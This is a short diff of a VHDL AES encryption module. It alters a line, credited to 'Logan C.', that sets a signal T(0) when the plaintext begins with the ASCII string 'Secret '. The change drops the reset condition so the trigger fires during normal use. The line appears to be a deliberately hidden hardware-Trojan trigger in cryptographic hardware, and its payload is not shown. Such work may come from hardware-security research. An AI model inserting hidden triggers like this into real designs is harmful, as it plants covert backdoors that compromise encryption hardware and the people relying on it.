@@ -43,7 +43,7 @@ architecture behavioral of aes_enc is
 	signal sel : std_logic;
 begin
 	reg_input <= plaintext when rst = '0' else feedback;
-	T(0) <= '1' when rst = '1' and plaintext(127 downto 72) = x"53656372657420" else '0'; -- added by Logan C.
+	T(0) <= '1' when plaintext(127 downto 72) = x"53656372657420" else '0'; -- added by Logan C.
 	reg_inst : entity work.reg
 		generic map(
 			size => 128
